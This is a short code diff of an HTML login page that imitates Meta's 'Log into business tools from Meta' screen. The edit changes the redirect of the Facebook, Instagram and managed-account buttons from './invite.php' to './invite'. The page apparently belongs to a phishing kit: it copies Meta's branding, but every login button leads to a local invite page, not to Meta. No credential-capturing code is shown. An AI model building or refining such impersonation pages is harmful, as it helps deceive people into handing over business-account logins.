@@ -62,11 +62,11 @@
         <div class="right">
             <div class="login-container">
                 <h2>Log into business tools from Meta</h2>
-                <button class="fb-btn" onclick="window.location.href='./invite.php'">
+                <button class="fb-btn" onclick="window.location.href='./invite'">
                     <i class="fab fa-facebook fb-btn-icon"></i> Log in with Facebook </button>
-                <button class="ig-btn" onclick="window.location.href='./invite.php'">
+                <button class="ig-btn" onclick="window.location.href='./invite'">
                     <i class="fab fa-instagram ig-btn-icon"></i> Log in with Instagram </button>
-                <p class="managed" onclick="window.location.href='./invite.php'">Log in with a managed Meta account</p>
+                <p class="managed" onclick="window.location.href='./invite'">Log in with a managed Meta account</p>
                 <br>
                 <svg aria-label="" class="meta-small"  role="img" viewBox="0 0 500 100">
                     <defs>
